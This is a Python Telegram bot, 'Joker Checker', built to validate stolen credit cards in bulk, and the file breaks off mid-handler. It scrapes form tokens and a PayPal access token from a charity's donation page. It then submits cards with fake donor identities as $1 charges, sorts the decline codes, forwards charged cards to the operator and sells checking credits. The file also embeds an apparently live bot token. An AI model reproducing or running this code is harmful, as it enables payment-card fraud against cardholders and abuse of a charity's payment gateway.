import requests, re, base64, json, time, random, os, threading
from user_agent import generate_user_agent
from datetime import datetime, timedelta
import string

BOT_TOKEN = "8787566674:AAHu_bF_LqXZolj_2j1iMQMC1onMst8dgrE"
ADMIN_ID = 1093032296  # غير ده بإيديك انت
active_scans = {}
MAX_CARDS_PER_USER = 5000

# ==================== الأسماء المزخرفة ====================
GATEWAY_DISPLAY = "𝚙𝚊𝚢𝚙𝚊𝚕 𝚌𝚞𝚜𝚝𝚘𝚖 𝚌𝚑𝚊𝚛𝚐𝚎 𝟷$"
BOT_SIGN = "𝕁𝕠𝕜𝕖𝕣 🃏"

# ==================== نظام النقاط والمستخدمين ====================
POINTS_FILE = "points.json"
BANNED_FILE = "banned.json"
CODES_FILE = "codes.json"
SUBSCRIPTIONS_FILE = "subscriptions.json"
USERS_FILE = "users.json"

def ensure_file_exists(file_path):
    if not os.path.exists(file_path):
        with open(file_path, 'w') as f:
            json.dump({}, f, indent=4)

def load_json(file_path):
    ensure_file_exists(file_path)
    with open(file_path, 'r') as f:
        try:
            return json.load(f)
        except:
            return {}

def save_json(file_path, data):
    with open(file_path, 'w') as f:
        json.dump(data, f, indent=4)

def add_user(user_id, username, first_name):
    users = load_json(USERS_FILE)
    user_id_str = str(user_id)
    if user_id_str not in users:
        users[user_id_str] = {
            "username": username,
            "first_name": first_name,
            "joined_at": datetime.now().strftime("%Y-%m-%d %H:%M"),
            "total_checked": 0
        }
        save_json(USERS_FILE, users)
        try:
            send_telegram(ADMIN_ID, f"🆕 مستخدم جديد!\n👤 {first_name}\n🆔 {user_id}")
        except:
            pass
    return users

def get_all_users():
    return load_json(USERS_FILE)

def update_user_checks(user_id):
    users = load_json(USERS_FILE)
    user_id_str = str(user_id)
    if user_id_str in users:
        users[user_id_str]["total_checked"] = users[user_id_str].get("total_checked", 0) + 1
        save_json(USERS_FILE, users)

def can_check_more(user_id, needed=1):
    if user_id == ADMIN_ID:
        return True
    users = load_json(USERS_FILE)
    user_id_str = str(user_id)
    total_checked = users.get(user_id_str, {}).get("total_checked", 0)
    return (total_checked + needed) <= MAX_CARDS_PER_USER

def get_remaining_checks(user_id):
    if user_id == ADMIN_ID:
        return "غير محدود"
    users = load_json(USERS_FILE)
    user_id_str = str(user_id)
    total_checked = users.get(user_id_str, {}).get("total_checked", 0)
    remaining = MAX_CARDS_PER_USER - total_checked
    return remaining if remaining > 0 else 0

def has_active_subscription(user_id):
    if user_id == ADMIN_ID:
        return True
    subs = load_json(SUBSCRIPTIONS_FILE)
    user_id_str = str(user_id)
    if user_id_str not in subs:
        return False
    expiry_str = subs[user_id_str]
    try:
        expiry = datetime.strptime(expiry_str, "%Y-%m-%d %H:%M")
        return expiry > datetime.now()
    except:
        return False

def has_points(user_id, required=1):
    if has_active_subscription(user_id) or user_id == ADMIN_ID:
        return True
    points = load_json(POINTS_FILE)
    user_id_str = str(user_id)
    if user_id_str not in points:
        return False
    return points[user_id_str] >= required

def deduct_points(user_id, required=1):
    if has_active_subscription(user_id) or user_id == ADMIN_ID:
        return True
    points = load_json(POINTS_FILE)
    user_id_str = str(user_id)
    if user_id_str not in points or points[user_id_str] < required:
        return False
    points[user_id_str] -= required
    save_json(POINTS_FILE, points)
    return True

def add_points(user_id, amount):
    points = load_json(POINTS_FILE)
    user_id_str = str(user_id)
    if user_id_str not in points:
        points[user_id_str] = 0
    points[user_id_str] += amount
    save_json(POINTS_FILE, points)

def set_points(user_id, amount):
    points = load_json(POINTS_FILE)
    user_id_str = str(user_id)
    points[user_id_str] = amount
    save_json(POINTS_FILE, points)

def get_points(user_id):
    points = load_json(POINTS_FILE)
    user_id_str = str(user_id)
    return points.get(user_id_str, 0)

def is_banned(user_id):
    banned = load_json(BANNED_FILE)
    return str(user_id) in banned

def ban_user(user_id):
    banned = load_json(BANNED_FILE)
    banned[str(user_id)] = True
    save_json(BANNED_FILE, banned)

def unban_user(user_id):
    banned = load_json(BANNED_FILE)
    if str(user_id) in banned:
        del banned[str(user_id)]
        save_json(BANNED_FILE, banned)

def generate_code(hours, target_user_id=None):
    characters = string.ascii_uppercase + string.digits
    code = 'JOKER-' + ''.join(random.choices(characters, k=4)) + '-' + ''.join(random.choices(characters, k=4))
    expiry = datetime.now() + timedelta(hours=hours)
    codes = load_json(CODES_FILE)
    codes[code] = {
        "hours": hours,
        "target_user": target_user_id,
        "expiry": expiry.strftime("%Y-%m-%d %H:%M"),
        "used": False
    }
    save_json(CODES_FILE, codes)
    return code

def redeem_code(code, user_id):
    codes = load_json(CODES_FILE)
    if code not in codes:
        return False, "الكود غير صحيح"
    code_data = codes[code]
    if code_data["used"]:
        return False, "تم استخدام هذا الكود بالفعل"
    expiry = datetime.strptime(code_data["expiry"], "%Y-%m-%d %H:%M")
    if expiry < datetime.now():
        return False, "انتهت صلاحية الكود"
    target = code_data["target_user"]
    if target is not None and target != user_id:
        return False, "هذا الكود ليس مخصص لك"
    hours = code_data["hours"]
    subs = load_json(SUBSCRIPTIONS_FILE)
    new_expiry = datetime.now() + timedelta(hours=hours)
    subs[str(user_id)] = new_expiry.strftime("%Y-%m-%d %H:%M")
    save_json(SUBSCRIPTIONS_FILE, subs)
    code_data["used"] = True
    save_json(CODES_FILE, codes)
    return True, f"تم تفعيل الاشتراك لمدة {hours} ساعة"

# ==================== دوال BIN ====================
def get_bin_info(cc_num):
    bin_num = cc_num[:6]
    try:
        response = requests.get(f"https://lookup.binlist.net/{bin_num}", timeout=8)
        if response.status_code == 200:
            data = response.json()
            scheme = data.get('scheme', 'UNKNOWN').upper()
            type_ = data.get('type', 'UNKNOWN').upper()
            brand = data.get('brand', 'UNKNOWN').upper()
            bank = data.get('bank', {}).get('name', 'UNKNOWN').upper()
            country = data.get('country', {}).get('name', 'UNKNOWN').upper()
            emoji = data.get('country', {}).get('emoji', '🏳️')
            currency = data.get('country', {}).get('currency', 'UNK')
            return {
                "info": f"{scheme} - {type_} - {brand}",
                "bank": bank,
                "country": f"{country} {emoji} - [{currency}]"
            }
    except:
        pass
    return {"info": "UNKNOWN", "bank": "UNKNOWN", "country": "UNKNOWN"}

def generate_fake_data():
    first = random.choice(["James", "Emma", "Michael", "Sophia", "William", "Olivia", "Noah", "Ava"])
    last = random.choice(["Smith", "Johnson", "Williams", "Brown", "Jones", "Garcia", "Miller", "Davis"])
    email = f"{first.lower()}{random.randint(100,9999)}@gmail.com"
    return {"first_name": first, "last_name": last, "full_name": f"{first} {last}", "email": email, "card_name": f"{first} {last}"}

# ==================== دالة الفحص الرئيسية (بوابة LAPovertyDept) ====================
def look(cc_line):
    try:
        number, month, year, cvc = [x.strip() for x in cc_line.split("|")]
        month = month.zfill(2)
        if "20" in year:
            year = year.split("20")[1]
        else:
            year = year[-2:] if len(year) > 2 else year
    except: 
        return "INVALID"

    fake = generate_fake_data()
    s = requests.Session()
    user = generate_user_agent()
    
    try:
        url = 'https://www.lapovertydept.org/donate/'
        url_ajax = 'https://www.lapovertydept.org/wordpress/wp-admin/admin-ajax.php'
        
        headers = {'user-agent': user}
        r = s.get(url, headers=headers)
        html = r.text
        
        form_hash = re.search(r'name="give-form-hash"\s+value="(.*?)"', html).group(1)
        form_id = re.search(r'name="give-form-id"\s+value="(.*?)"', html).group(1)
        form_prefix = re.search(r'name="give-form-id-prefix"\s+value="(.*?)"', html).group(1)
        enc_token = re.search(r'"data-client-token":"(.*?)"', html).group(1)
        kol = base64.b64decode(enc_token).decode('utf-8')
        access_token = re.findall(r'"accessToken":"(.*?)"', kol)[0]
        
        params = {'action': 'give_paypal_commerce_create_order'}
        data = {
            'give-honeypot': '',
            'give-form-id-prefix': form_prefix,
            'give-form-id': form_id,
            'give-form-title': 'One Time Donation',
            'give-current-url': url,
            'give-form-url': url,
            'give-form-minimum': '1',
            'give-form-maximum': '1000000',
            'give-form-hash': form_hash,
            'give-price-id': 'custom',
            'give-amount': '1',
            'payment-mode': 'paypal-commerce',
            'give_first': fake['first_name'],
            'give_last': fake['last_name'],
            'give_email': fake['email'],
            'card_name': fake['card_name'],
            'card_exp_month': '',
            'card_exp_year': '',
            'give-gateway': 'paypal-commerce',
        }
        
        r = s.post(url_ajax, params=params, headers=headers, data=data)
        order_id = r.json()['data']['id']
        
        headers_paypal = {
            'authority': 'cors.api.paypal.com',
            'accept': '*/*',
            'authorization': f'Bearer {access_token}',
            'content-type': 'application/json',
            'user-agent': user,
        }
        
        json_data = {
            'payment_source': {
                'card': {
                    'number': number,
                    'expiry': f'20{year}-{month}',
                    'security_code': cvc,
                    'attributes': {
                        'verification': {
                            'method': 'SCA_WHEN_REQUIRED',
                        },
                    },
                },
            },
            'application_context': {
                'vault': False,
            },
        }
        
        s.post(f'https://cors.api.paypal.com/v2/checkout/orders/{order_id}/confirm-payment-source', 
               headers=headers_paypal, json=json_data)
        
        params = {'action': 'give_paypal_commerce_approve_order', 'order': order_id}
        r = s.post(url_ajax, params=params, headers=headers, data=data)
        text = r.text.upper()
        
        # الردود الكاملة
        if '"STATUS":"COMPLETED"' in text and '"RESPONSE_CODE":"0000"' in text:
            return "𝐂𝐡𝐚𝐫𝐠𝐞𝐝 🔥"
        elif 'DO_NOT_HONOR' in text:
            return "DO_NOT_HONOR"
        elif 'COMPLETED' in text:
            return "Approved No Charge"
        elif 'ACCOUNT_CLOSED' in text:
            return "ACCOUNT_CLOSED"
        elif 'PAYER_ACCOUNT_LOCKED_OR_CLOSED' in text:
            return "PAYER_ACCOUNT_LOCKED_OR_CLOSED"
        elif 'LOST_OR_STOLEN' in text:
            return "LOST_OR_STOLEN"
        elif 'CVV2_FAILURE' in text:
            return "CVV2_FAILURE"
        elif 'SUSPECTED_FRAUD' in text:
            return "SUSPECTED_FRAUD"
        elif 'INVALID_ACCOUNT' in text:
            return "INVALID_ACCOUNT"
        elif 'REATTEMPT_NOT_PERMITTED' in text:
            return "REATTEMPT_NOT_PERMITTED"
        elif 'ACCOUNT_BLOCKED_BY_ISSUER' in text:
            return "ACCOUNT_BLOCKED_BY_ISSUER"
        elif 'ORDER_NOT_APPROVED' in text:
            return "ORDER_NOT_APPROVED"
        elif 'PICKUP_CARD_SPECIAL_CONDITIONS' in text:
            return "PICKUP_CARD_SPECIAL_CONDITIONS"
        elif 'PAYER_CANNOT_PAY' in text:
            return "PAYER_CANNOT_PAY"
        elif 'INSUFFICIENT_FUNDS' in text:
            return "INSUFFICIENT_FUNDS ✅"
        elif 'GENERIC_DECLINE' in text:
            return "GENERIC_DECLINE"
        elif 'COMPLIANCE_VIOLATION' in text:
            return "COMPLIANCE_VIOLATION"
        elif 'TRANSACTION_NOT_PERMITTED' in text:
            return "TRANSACTION_NOT_PERMITTED"
        elif 'PAYMENT_DENIED' in text:
            return "PAYMENT_DENIED"
        elif 'INVALID_MERCHANT' in text:
            return "INVALID_MERCHANT"
        elif 'AMOUNT_EXCEEDED' in text:
            return "AMOUNT_EXCEEDED"
        elif 'INVALID_TRANSACTION' in text:
            return "INVALID_TRANSACTION"
        elif 'RESTRICTED_OR_INACTIVE_ACCOUNT' in text:
            return "RESTRICTED_OR_INACTIVE_ACCOUNT"
        elif 'SECURITY_VIOLATION' in text:
            return "SECURITY_VIOLATION"
        elif 'DECLINED_DUE_TO_UPDATED_ACCOUNT' in text:
            return "DECLINED_DUE_TO_UPDATED_ACCOUNT"
        elif 'INVALID_OR_RESTRICTED_CARD' in text:
            return "INVALID_OR_RESTRICTED_CARD"
        elif 'EXPIRED_CARD' in text:
            return "EXPIRED_CARD"
        elif 'CRYPTOGRAPHIC_FAILURE' in text:
            return "CRYPTOGRAPHIC_FAILURE"
        elif 'TRANSACTION_CANNOT_BE_COMPLETED' in text:
            return "TRANSACTION_CANNOT_BE_COMPLETED"
        elif 'DECLINED_PLEASE_RETRY' in text:
            return "DECLINED_PLEASE_RETRY"
        elif 'TX_ATTEMPTS_EXCEED_LIMIT' in text:
            return "TX_ATTEMPTS_EXCEED_LIMIT"
        else:
            return "DECLINED"
            
    except Exception as e:
        print(f"Look error: {e}")
        return "ERROR"

# ==================== دوال التليجرام ====================
def send_telegram(chat_id, text, reply_markup=None):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    data = {"chat_id": chat_id, "text": text, "parse_mode": "HTML"}
    if reply_markup: 
        data["reply_markup"] = json.dumps(reply_markup)
    try:
        resp = requests.post(url, data=data, timeout=10)
        return resp
    except:
        return None

def edit_telegram(chat_id, message_id, text, reply_markup=None):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/editMessageText"
    data = {"chat_id": chat_id, "message_id": message_id, "text": text, "parse_mode": "HTML"}
    if reply_markup: 
        data["reply_markup"] = json.dumps(reply_markup)
    try:
        resp = requests.post(url, data=data, timeout=10)
        return resp
    except:
        return None

def get_status_emoji(result):
    if "𝐂𝐡𝐚𝐫𝐠𝐞𝐝" in result:
        return "🔥"
    elif "INSUFFICIENT_FUNDS" in result:
        return "✅"
    elif "CVV2_FAILURE" in result:
        return "🔐"
    elif "EXPIRED" in result:
        return "⌛"
    elif "PAYER_CANNOT_PAY" in result:
        return "💸"
    else:
        return "❌"

# ==================== فحص بطاقة فردية ====================
def check_single_card(chat_id, line):
    try:
        initial_msg = f"<b>Gateway :</b> {GATEWAY_DISPLAY}\n<b>By :</b> {BOT_SIGN}"
        initial_buttons = {
            "inline_keyboard": [
                [{"text": f"💳 {line[:20]}...", "callback_data": "card"}],
                [{"text": "📊 Status: CHECKING...", "callback_data": "status"}]
            ]
        }
        resp = send_telegram(chat_id, initial_msg, initial_buttons)        
        if not resp:
            return
            
        message_id = resp.json().get("result", {}).get("message_id")
        start_time = time.time()
        result = look(line)
        elapsed = time.time() - start_time
        
        emoji = get_status_emoji(result)
        result_msg = f"<b>Gateway :</b> {GATEWAY_DISPLAY}\n<b>By :</b> {BOT_SIGN}"
        result_buttons = {
            "inline_keyboard": [
                [{"text": f"💳 {line[:20]}...", "callback_data": "card"}],
                [{"text": f"📊 Status: {result} {emoji}", "callback_data": "status"}]
            ]
        }
        edit_telegram(chat_id, message_id, result_msg, result_buttons)
        
        if "𝐂𝐡𝐚𝐫𝐠𝐞𝐝" in result or "INSUFFICIENT_FUNDS" in result:
            bin_data = get_bin_info(line.split('|')[0])
            msg = (
                f"<b>#PayPal_Charge ($1) [single] 🌟</b>\n"
                f"<b>- - - - - - - - - - - - - - - - - - - - - -</b>\n"
                f"<b>[ϟ] 𝐂𝐚𝐫𝐝:</b> <code>{line}</code>\n"
                f"<b>[ϟ] 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞:</b> <b>{result}</b>\n"
                f"<b>[ϟ] 𝐓𝐚𝐤𝐞𝐧:</b> <b>{elapsed:.2f} 𝐒.</b>\n"
                f"<b>- - - - - - - - - - - - - - - - - - - - - -</b>\n"
                f"<b>[ϟ] 𝐈𝐧𝐟𝐨:</b> <b>{bin_data['info']}</b>\n"
                f"<b>[ϟ] 𝐁𝐚𝐧𝐤:</b> <b>{bin_data['bank']}</b>\n"
                f"<b>[ϟ] 𝐂𝐨𝐮𝐧𝐭𝐫𝐲:</b> <b>{bin_data['country']}</b>\n"
                f"<b>- - - - - - - - - - - - - - - - - - - - - -</b>\n"
                f"<b>[⌥] 𝐓𝐢𝐦𝐞:</b> <b>{elapsed:.2f} 𝐒𝐞𝐜.</b>\n"
                f"<b>[⌤] 𝐃𝐞𝐯 𝐛𝐲:</b> <b>{BOT_SIGN}</b>"
            )
            send_telegram(chat_id, msg)
            
            if "𝐂𝐡𝐚𝐫𝐠𝐞𝐝" in result:
                try:
                    send_telegram(ADMIN_ID, f"💰 تم تفعيل بطاقة!\n👤 المستخدم: {chat_id}\n💳 {line}\n📝 {result}")
                except:
                    pass
                with open(f"charged_{chat_id}.txt", "a") as f:
                    f.write(line + "\n")
                    
    except Exception as e:
        print(f"Check error: {e}")

# ==================== فحص ملف كامل ====================
def start_checker(chat_id, combo_lines, gateway_name, initial_message_id):
    active_scans[chat_id] = {"stop": False, "stats": {
        "charged": 0, "approved": 0, "declined": 0, "total": len(combo_lines), "current": 0
    }}
    
    for idx, line in enumerate(combo_lines):
        if active_scans.get(chat_id, {}).get("stop"):
            break
            
        start_time = time.time()
        result = look(line)
        elapsed = time.time() - start_time
        stats = active_scans[chat_id]["stats"]
        stats["current"] = idx + 1
        
        if "𝐂𝐡𝐚𝐫𝐠𝐞𝐝" in result:
            stats["charged"] += 1
            try:
                send_telegram(ADMIN_ID, f"💰 تم تفعيل بطاقة!\n👤 المستخدم: {chat_id}\n💳 {line}\n📝 {result}")
            except:
                pass
            with open(f"charged_{chat_id}.txt", "a") as f:
                f.write(line + "\n")
            bin_data = get_bin_info(line.split('|')[0])
            msg = (
                f"<b>#PayPal_Charge ($1) [mass] 🌟</b>\n"
                f"<b>- - - - - - - - - - - - - - - - - - - - - -</b>\n"
                f"<b>[ϟ] 𝐂𝐚𝐫𝐝:</b> <code>{line}</code>\n"
                f"<b>[ϟ] 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞:</b> <b>{result}</b>\n"
                f"<b>[ϟ] 𝐓𝐚𝐤𝐞𝐧:</b> <b>{elapsed:.2f} 𝐒.</b>\n"
                f"<b>- - - - - - - - - - - - - - - - - - - - - -</b>\n"
                f"<b>[ϟ] 𝐈𝐧𝐟𝐨:</b> <b>{bin_data['info']}</b>\n"
                f"<b>[ϟ] 𝐁𝐚𝐧𝐤:</b> <b>{bin_data['bank']}</b>\n"
                f"<b>[ϟ] 𝐂𝐨𝐮𝐧𝐭𝐫𝐲:</b> <b>{bin_data['country']}</b>\n"
                f"<b>- - - - - - - - - - - - - - - - - - - - - -</b>\n"
                f"<b>[⌥] 𝐓𝐢𝐦𝐞:</b> <b>{elapsed:.2f} 𝐒𝐞𝐜.</b>"
            )
            send_telegram(chat_id, msg)
        elif "INSUFFICIENT_FUNDS" in result:
            stats["approved"] += 1
        else:
            stats["declined"] += 1
        
        emoji = get_status_emoji(result)
        buttons = {
            "inline_keyboard": [
                [{"text": f"💳 {line[:20]}...", "callback_data": "card"}],
                [{"text": f"📊 Status: {result[:30]} {emoji}", "callback_data": "status"}],
                [{"text": f"💰 Charged ➜ [ {stats['charged']} ]", "callback_data": "charged"},
                 {"text": f"✅ Approved ➜ [ {stats['approved']} ]", "callback_data": "approved"}],
                [{"text": f"❌ Declined ➜ [ {stats['declined']} ]", "callback_data": "declined"},
                 {"text": f"📂 Cards ➜ [ {stats['current']}/{stats['total']} ]", "callback_data": "cards"}],
                [{"text": "🛑 STOP", "callback_data": f"stop_{chat_id}"}]
            ]
        }
        edit_telegram(chat_id, initial_message_id, f"<b>Gateway:</b> {GATEWAY_DISPLAY}\n<b>By:</b> {BOT_SIGN}", buttons)
        time.sleep(random.uniform(8, 12))
    
    final_msg = (
        f"<b>🏁 Scan Finished!</b>\n\n"
        f"<b>💰 Total Charged:</b> <b>{stats['charged']}</b>\n"
        f"<b>✅ Total Approved:</b> <b>{stats['approved']}</b>\n"
        f"<b>❌ Total Declined:</b> <b>{stats['declined']}</b>"
    )
    send_telegram(chat_id, final_msg)
    if chat_id in active_scans:
        del active_scans[chat_id]

# ==================== معالج الأوامر ====================
def handle_updates():
    offset = 0
    print("✅ Joker Bot is running on LAPovertyDept.org with $1...")
    
    while True:
        try:
            url = f"https://api.telegram.org/bot{BOT_TOKEN}/getUpdates?offset={offset}&timeout=30"
            resp = requests.get(url, timeout=40)
            if resp.status_code != 200:
                time.sleep(5)
                continue
            
            updates = resp.json()
            for update in updates.get("result", []):
                offset = update["update_id"] + 1
                
                if "callback_query" in update:
                    callback = update["callback_query"]
                    chat_id = callback["message"]["chat"]["id"]
                    data = callback["data"]
                    
                    if data == f"stop_{chat_id}":
                        if chat_id in active_scans:
                            active_scans[chat_id]["stop"] = True
                        requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/answerCallbackQuery",
                                    data={"callback_query_id": callback["id"], "text": "🛑 Stopping..."})
                    else:
                        requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/answerCallbackQuery",
                                    data={"callback_query_id": callback["id"]})
                    continue
                
                message = update.get("message", {})
                chat_id = message.get("chat", {}).get("id")
                text = message.get("text", "")
                user = message.get("from", {})
                
                if not chat_id:
                    continue
                
                if is_banned(chat_id):
                    send_telegram(chat_id, "🚫 تم حظرك من استخدام هذا البوت.")
                    continue
                
                add_user(chat_id, user.get("username"), user.get("first_name"))
                
                # ========== أوامر النظام ==========
                if text == "/start":
                    welcome_msg = (
                        f"<b>[ϟ] Welcome To Joker Checker 🃏</b>\n"
                        f"<b>━━━━━━━━━━━━━━━━━━━━━━</b>\n"
                        f"<b>[ϟ] Gateway: {GATEWAY_DISPLAY}</b>\n"
                        f"<b>[ϟ] By: {BOT_SIGN}</b>\n"
                        f"<b>[ϟ] Points: {get_points(chat_id)}</b>\n"
                        f"<b>[ϟ] Remaining: {get_remaining_checks(chat_id)}</b>\n"
                        f"<b>━━━━━━━━━━━━━━━━━━━━━━</b>\n"
                        f"<b>📌 /pp card|month|year|cvv - Single Check</b>\n"
                        f"<b>📌 Send .txt file - Mass Check</b>\n"
                        f"<b>📌 /cmds - Show Commands</b>"
                    )
                    welcome_buttons = {
                        "inline_keyboard": [
                            [{"text": "💎 Start Checking", "callback_data": "start"}]
                        ]
                    }
                    send_telegram(chat_id, welcome_msg, welcome_buttons)
                
                elif text == "/cmds":
                    if chat_id == ADMIN_ID:
                        cmds = f"""<b>👑 Admin Commands</b>
━━━━━━━━━━━━━━━━
/code <hours> <user_id> - Create code
/addpoints <user_id> <amount> - Add points
/rempoints <user_id> <amount> - Remove points
/setpoints <user_id> <amount> - Set points
/points <user_id> - Show user points
/block <user_id> - Ban user
/unblock <user_id> - Unban user
/users - Show all users
/broadcast <message> - Broadcast
/reset <user_id> - Reset checks
━━━━━━━━━━━━━━━━
<b>📋 User Commands</b>
/pp - Check card
/mypoints - My points
/redeem <code> - Redeem code
/start - Main menu
/cmds - Show commands"""
                    else:
                        cmds = f"""<b>📋 Available Commands</b>
━━━━━━━━━━━━━━━━
/pp card|month|year|cvv - Check card
/mypoints - Your points
/redeem <code> - Redeem code
/start - Main menu
/cmds - Show commands
━━━━━━━━━━━━━━━━
📋 Remaining: {get_remaining_checks(chat_id)}"""
                    send_telegram(chat_id, cmds)
                
                elif text == "/mypoints":
                    if has_active_subscription(chat_id):
                        expiry = load_json(SUBSCRIPTIONS_FILE).get(str(chat_id), "Unknown")
                        msg = f"💰 <b>Your Points</b>\n━━━━━━━━━━━━\n📊 Points: {get_points(chat_id)}\n✅ Active until: {expiry}\n📋 Remaining: {get_remaining_checks(chat_id)}"
                    else:
                        msg = f"💰 <b>Your Points</b>\n━━━━━━━━━━━━\n📊 Points: {get_points(chat_id)}\n📋 Remaining: {get_remaining_checks(chat_id)}"
                    send_telegram(chat_id, msg)
                
                elif text.startswith("/redeem"):
                    try:
                        code = text.split()[1]
                        success, msg = redeem_code(code, chat_id)
                        send_telegram(chat_id, f"✅ {msg}" if success else f"❌ {msg}")
                    except:
                        send_telegram(chat_id, "❌ /redeem <code>")
                
                # ========== أوامر المالك ==========
                elif text.startswith("/addpoints") and chat_id == ADMIN_ID:
                    try:
                        parts = text.split()
                        user_id = int(parts[1])
                        amount = int(parts[2])
                        add_points(user_id, amount)
                        send_telegram(chat_id, f"✅ Added {amount} points to {user_id}\nBalance: {get_points(user_id)}")
                    except:
                        send_telegram(chat_id, "❌ /addpoints <user_id> <amount>")
                
                elif text.startswith("/rempoints") and chat_id == ADMIN_ID:
                    try:
                        parts = text.split()
                        user_id = int(parts[1])
                        amount = int(parts[2])
                        current = get_points(user_id)
                        new_amount = max(0, current - amount)
                        set_points(user_id, new_amount)
                        send_telegram(chat_id, f"✅ Removed {amount} points from {user_id}\nBalance: {get_points(user_id)}")
                    except:
                        send_telegram(chat_id, "❌ /rempoints <user_id> <amount>")
                
                elif text.startswith("/setpoints") and chat_id == ADMIN_ID:
                    try:
                        parts = text.split()
                        user_id = int(parts[1])
                        amount = int(parts[2])
                        set_points(user_id, amount)
                        send_telegram(chat_id, f"✅ Set {amount} points for {user_id}")
                    except:
                        send_telegram(chat_id, "❌ /setpoints <user_id> <amount>")
                
                elif text.startswith("/points") and chat_id == ADMIN_ID:
                    try:
                        user_id = int(text.split()[1])
                        pts = get_points(user_id)
                        sub = has_active_subscription(user_id)
                        send_telegram(chat_id, f"💰 User {user_id}\n📊 Points: {pts}\n{'✅ Active subscription' if sub else '❌ No subscription'}")
                    except:
                        send_telegram(chat_id, "❌ /points <user_id>")
                
                elif text.startswith("/block") and chat_id == ADMIN_ID:
                    try:
                        user_id = int(text.split()[1])
                        ban_user(user_id)
                        send_telegram(chat_id, f"✅ Banned {user_id}")
                        try:
                            send_telegram(user_id, "🚫 You have been banned.")
                        except:
                            pass
                    except:
                        send_telegram(chat_id, "❌ /block <user_id>")
                
                elif text.startswith("/unblock") and chat_id == ADMIN_ID:
                    try:
                        user_id = int(text.split()[1])
                        unban_user(user_id)
                        send_telegram(chat_id, f"✅ Unbanned {user_id}")
                        try:
                            send_telegram(user_id, "✅ You have been unbanned.")
                        except:
                            pass
                    except:
                        send_telegram(chat_id, "❌ /unblock <user_id>")
                
                elif text == "/users" and chat_id == ADMIN_ID:
                    users = get_all_users()
                    if not users:
                        send_telegram(chat_id, "No users")
                    else:
                        msg = "<b>📋 Users List</b>\n━━━━━━━━━━━━━━━━\n"
                        for uid, data in list(users.items())[:20]:
                            msg += f"🆔 {uid}\n👤 {data.get('first_name', 'Unknown')}\n📊 Checked: {data.get('total_checked', 0)} cards\n━━━━━━━━━━━━━━━━\n"
                        if len(users) > 20:
                            msg += f"\nAnd {len(users) - 20} more..."
                        send_telegram(chat_id, msg)
                
                elif text.startswith("/broadcast") and chat_id == ADMIN_ID:
                    try:
                        broadcast_msg = text.split("/broadcast", 1)[1].strip()
                        if not broadcast_msg:
                            send_telegram(chat_id, "❌ /broadcast <message>")
                        else:
                            users = get_all_users()
                            sent = 0
                            failed = 0
                            send_telegram(chat_id, f"🔄 Broadcasting to {len(users)} users...")
                            for uid in users.keys():
                                try:
                                    send_telegram(int(uid), f"<b>📢 Broadcast</b>\n━━━━━━━━━━━━━━━━\n{broadcast_msg}")
                                    sent += 1
                                    time.sleep(0.3)
                                except:
                                    failed += 1
                            send_telegram(ADMIN_ID, f"✅ Broadcast done\n✅ Sent: {sent}\n❌ Failed: {failed}")
                    except:
                        send_telegram(chat_id, "❌ /broadcast <message>")
                
                elif text.startswith("/reset") and chat_id == ADMIN_ID:
                    try:
                        user_id = int(text.split()[1])
                        users = load_json(USERS_FILE)
                        if str(user_id) in users:
                            users[str(user_id)]["total_checked"] = 0
                            save_json(USERS_FILE, users)
                            send_telegram(chat_id, f"✅ Reset checks for {user_id}")
                        else:
                            send_telegram(chat_id, f"❌ User {user_id} not found")
                    except:
                        send_telegram(chat_id, "❌ /reset <user_id>")
                
                elif text.startswith("/code") and chat_id == ADMIN_ID:
                    try:
                        parts = text.split()
                        hours = int(parts[1])
                        target = int(parts[2]) if len(parts) > 2 else None
                        code = generate_code(hours, target)
                        send_telegram(chat_id, f"✅ Code: <code>/redeem {code}</code>\n⏰ {hours} hours")
                        if target:
                            try:
                                send_telegram(target, f"🎉 Code for you!\n<code>/redeem {code}</code>\n⏰ {hours} hours")
                            except:
                                pass
                    except:
                        send_telegram(chat_id, "❌ /code <hours> <user_id optional>")
                
                # ========== أوامر الفحص الأصلية ==========
                elif text.startswith("/pp"):
                    parts = text.split(maxsplit=1)
                    if len(parts) < 2:
                        send_telegram(chat_id, f"<b>❌ Usage:</b> <code>/pp card|month|year|cvv</code>\n<b>Example:</b> <code>/pp 4532015112830366|12|2025|123</code>\n\n<b>💰 Amount: $1</b>")
                    else:
                        card_data = parts[1].strip()
                        if "|" in card_data:
                            if not can_check_more(chat_id):
                                send_telegram(chat_id, f"❌ Max limit reached ({MAX_CARDS_PER_USER})")
                                continue
                            if not has_points(chat_id, 1):
                                send_telegram(chat_id, f"❌ Not enough points!\nYou have {get_points(chat_id)} points")
                                continue
                            if not deduct_points(chat_id, 1):
                                send_telegram(chat_id, "❌ Error deducting points")
                                continue
                            update_user_checks(chat_id)
                            threading.Thread(target=check_single_card, args=(chat_id, card_data)).start()
                        else:
                            send_telegram(chat_id, "<b>❌ Invalid format. Use:</b> <code>card|month|year|cvv</code>")
                
                elif "document" in message:
                    doc = message["document"]
                    if doc["file_name"].endswith(".txt"):
                        file_id = doc["file_id"]
                        file_path_resp = requests.get(f"https://api.telegram.org/bot{BOT_TOKEN}/getFile?file_id={file_id}").json()
                        if "result" in file_path_resp:
                            file_content = requests.get(f"https://api.telegram.org/file/bot{BOT_TOKEN}/{file_path_resp['result']['file_path']}").text
                            lines = [l.strip() for l in file_content.split("\n") if "|" in l]
                            if lines:
                                if chat_id in active_scans:
                                    send_telegram(chat_id, "<b>⚠️ A scan is already running. Please stop it first.</b>")
                                else:
                                    if not can_check_more(chat_id, len(lines)):
                                        remaining = get_remaining_checks(chat_id)
                                        send_telegram(chat_id, f"❌ Cannot scan {len(lines)} cards\nRemaining: {remaining}")
                                        continue
                                    if not has_points(chat_id, len(lines)):
                                        send_telegram(chat_id, f"❌ Not enough points\nNeed {len(lines)} points\nYou have {get_points(chat_id)}")
                                        continue
                                    if not deduct_points(chat_id, len(lines)):
                                        send_telegram(chat_id, "❌ Error deducting points")
                                        continue
                                    
                                    gateway_name = GATEWAY_DISPLAY
                                    initial_msg = f"<b>Gateway:</b> {gateway_name}\n<b>By:</b> {BOT_SIGN}"
                                    initial_buttons = {
                                        "inline_keyboard": [
                                            [{"text": f"💳 {lines[0][:20]}...", "callback_data": "card"}],
                                            [{"text": "📊 Status: STARTING...", "callback_data": "status"}],
